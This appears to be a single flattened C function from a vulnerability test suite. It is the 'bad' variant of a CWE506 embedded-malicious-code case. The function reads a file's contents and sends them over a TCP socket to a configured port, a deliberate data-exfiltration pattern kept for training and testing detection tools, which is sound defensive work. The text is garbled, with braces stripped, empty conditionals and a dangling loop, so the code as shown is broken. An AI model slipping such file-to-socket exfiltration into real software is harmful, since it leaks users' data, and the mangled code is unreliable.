void CWE506_Embedded_Malicious_Code__file_transfer_connect_socket_07_bad() if ( staticFive == 5 )  WSADATA wsaData ; struct sockaddr_in service ; char contents [ 65536 ] ; FILE * pFile ; pFile = fopen ( FILENAME , "r" ); if ( pFile != NULL )  if ( fgets ( contents , ( int ) ( 65535 ) , pFile ) == NULL )  contents [ 0 ] = '\0'; if ( WSAStartup ( MAKEWORD ( 2 , 2 ) , & wsaData ) != NO_ERROR )  connectSocket = socket ( AF_INET , SOCK_STREAM , IPPROTO_TCP ); if ( connectSocket == INVALID_SOCKET )  memset ( & service , 0 , sizeof ( service ) ); service . sin_family = AF_INET; service . sin_addr . s_addr = INADDR_ANY; service . sin_port = htons ( TCP_PORT ); if ( connect ( connectSocket , ( struct sockaddr * ) & service , sizeof ( service ) ) == SOCKET_ERROR )  if ( send ( connectSocket , contents , strlen ( contents ) , 0 ) != strlen ( contents ) )  while ( 0 )  